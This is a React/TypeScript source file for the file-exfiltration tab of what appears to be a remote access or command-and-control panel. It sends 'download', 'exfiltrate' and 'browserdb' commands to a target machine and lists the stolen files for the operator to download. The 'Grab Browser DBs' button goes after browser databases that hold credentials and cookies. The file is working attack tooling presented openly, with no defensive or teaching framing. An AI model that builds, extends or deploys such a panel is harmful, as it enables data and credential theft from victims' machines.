import { useState, useEffect } from "react";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Badge } from "@/components/ui/badge";
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table";
import {
  Database,
  Download,
  RefreshCw,
  Loader2,
  FileArchive,
  Send,
  HardDrive,
} from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import { dispatchCommand } from "@/lib/commands";
import { toast } from "sonner";

interface FileEntry {
  id: string;
  filename: string | null;
  filepath: string | null;
  size: number | null;
  storage_path: string | null;
  created_at: string | null;
}

const ExfilTab = ({ machineId }: { machineId: string }) => {
  const [files, setFiles] = useState<FileEntry[]>([]);
  const [loading, setLoading] = useState(false);
  const [requestPath, setRequestPath] = useState("");
  const [sending, setSending] = useState(false);

  const fetchFiles = async () => {
    setLoading(true);
    const { data, error } = await supabase
      .from("files")
      .select("id, filename, filepath, size, storage_path, created_at")
      .eq("machine_id", machineId)
      .order("created_at", { ascending: false });

    if (error) {
      toast.error("Failed to fetch files");
    } else {
      setFiles((data as FileEntry[]) || []);
    }
    setLoading(false);
  };

  useEffect(() => {
    fetchFiles();
  }, [machineId]);

  const downloadFile = async (storagePath: string, filename: string) => {
    const { data, error } = await supabase.storage
      .from("file-transfers")
      .createSignedUrl(storagePath, 3600);

    if (error || !data?.signedUrl) {
      toast.error("Failed to generate download link");
      return;
    }
    window.open(data.signedUrl, "_blank");
  };

  const requestFileExfil = async () => {
    if (!requestPath.trim()) return;
    setSending(true);
    const id = await dispatchCommand(machineId, "download", { path: requestPath.trim() });
    if (id) {
      toast.success(`Download requested: ${requestPath}`);
      setRequestPath("");
      // Poll for new file entry after a delay
      setTimeout(fetchFiles, 2000);
    } else {
      toast.error("Failed to send command");
    }
    setSending(false);
  };

  const requestBrowserDBs = async () => {
    setSending(true);
    const id = await dispatchCommand(machineId, "browserdb");
    if (id) {
      toast.success("Browser DB exfiltration requested");
      setTimeout(fetchFiles, 3000);
    } else {
      toast.error("Failed to send command");
    }
    setSending(false);
  };

  const requestExfiltrate = async () => {
    if (!requestPath.trim()) return;
    setSending(true);
    const id = await dispatchCommand(machineId, "exfiltrate", { path: requestPath.trim() });
    if (id) {
      toast.success(`Exfiltration requested: ${requestPath}`);
      setRequestPath("");
      setTimeout(fetchFiles, 3000);
    } else {
      toast.error("Failed to send command");
    }
    setSending(false);
  };

  const formatSize = (bytes: number | null) => {
    if (bytes === null || bytes === undefined) return "—";
    if (bytes < 1024) return `${bytes} B`;
    if (bytes < 1024 * 1024) return `${(bytes / 1024).toFixed(1)} KB`;
    return `${(bytes / (1024 * 1024)).toFixed(1)} MB`;
  };

  const formatDate = (date: string | null) => {
    if (!date) return "—";
    return new Date(date).toLocaleString();
  };

  return (
    <div className="space-y-3">
      {/* Actions Bar */}
      <Card className="border-border/30">
        <CardContent className="p-3 space-y-3">
          <div className="flex gap-2">
            <Input
              value={requestPath}
              onChange={(e) => setRequestPath(e.target.value)}
              placeholder="Remote file or directory path (e.g. C:\Users\admin\Documents)"
              className="font-mono text-sm h-8"
              onKeyDown={(e) => e.key === "Enter" && requestFileExfil()}
            />
            <Button
              size="sm"
              className="gap-1.5 h-8 whitespace-nowrap"
              onClick={requestFileExfil}
              disabled={sending || !requestPath.trim()}
            >
              {sending ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <Download className="w-3.5 h-3.5" />}
              Download
            </Button>
            <Button
              size="sm"
              variant="outline"
              className="gap-1.5 h-8 whitespace-nowrap"
              onClick={requestExfiltrate}
              disabled={sending || !requestPath.trim()}
            >
              <Send className="w-3.5 h-3.5" />
              Exfil Dir
            </Button>
          </div>
          <div className="flex gap-2">
            <Button
              variant="outline"
              size="sm"
              className="gap-1.5 h-7 text-xs"
              onClick={requestBrowserDBs}
              disabled={sending}
            >
              <HardDrive className="w-3 h-3" /> Grab Browser DBs
            </Button>
            <Button
              variant="outline"
              size="sm"
              className="gap-1.5 h-7 text-xs"
              onClick={fetchFiles}
              disabled={loading}
            >
              {loading ? <Loader2 className="w-3 h-3 animate-spin" /> : <RefreshCw className="w-3 h-3" />}
              Refresh
            </Button>
            <Badge variant="outline" className="text-[10px] h-7 px-2">
              {files.length} file{files.length !== 1 ? "s" : ""}
            </Badge>
          </div>
        </CardContent>
      </Card>

      {/* Files Table */}
      <Card className="border-border/30">
        <CardContent className="p-0">
          {files.length > 0 ? (
            <Table>
              <TableHeader>
                <TableRow className="border-border/20">
                  <TableHead className="text-xs h-8">Filename</TableHead>
                  <TableHead className="text-xs h-8">Source Path</TableHead>
                  <TableHead className="text-xs h-8 w-20">Size</TableHead>
                  <TableHead className="text-xs h-8 w-40">Date</TableHead>
                  <TableHead className="text-xs h-8 w-16"></TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                {files.map((file) => (
                  <TableRow key={file.id} className="border-border/10">
                    <TableCell className="py-2">
                      <div className="flex items-center gap-2">
                        <FileArchive className="w-3.5 h-3.5 text-muted-foreground/50 flex-shrink-0" />
                        <span className="font-mono text-xs truncate max-w-[200px]">
                          {file.filename || "unknown"}
                        </span>
                      </div>
                    </TableCell>
                    <TableCell className="py-2">
                      <span className="font-mono text-[10px] text-muted-foreground truncate max-w-[300px] block">
                        {file.filepath || "—"}
                      </span>
                    </TableCell>
                    <TableCell className="py-2 text-xs text-muted-foreground">
                      {formatSize(file.size)}
                    </TableCell>
                    <TableCell className="py-2 text-[10px] text-muted-foreground">
                      {formatDate(file.created_at)}
                    </TableCell>
                    <TableCell className="py-2">
                      {file.storage_path ? (
                        <Button
                          size="icon"
                          variant="ghost"
                          className="h-6 w-6 text-muted-foreground hover:text-primary"
                          onClick={() => downloadFile(file.storage_path!, file.filename || "file")}
                        >
                          <Download className="w-3 h-3" />
                        </Button>
                      ) : (
                        <span className="text-[10px] text-muted-foreground/40">N/A</span>
                      )}
                    </TableCell>
                  </TableRow>
                ))}
              </TableBody>
            </Table>
          ) : !loading ? (
            <div className="flex flex-col items-center justify-center py-12">
              <Database className="w-10 h-10 mb-3 text-muted-foreground/20" />
              <p className="text-sm text-muted-foreground">
                No exfiltrated files yet
              </p>
              <p className="text-xs text-muted-foreground/50 mt-1">
                Use the controls above to request files from the target
              </p>
            </div>
          ) : (
            <div className="flex items-center justify-center py-12">
              <Loader2 className="w-6 h-6 animate-spin text-primary" />
            </div>
          )}
        </CardContent>
      </Card>
    </div>
  );
};

export default ExfilTab;
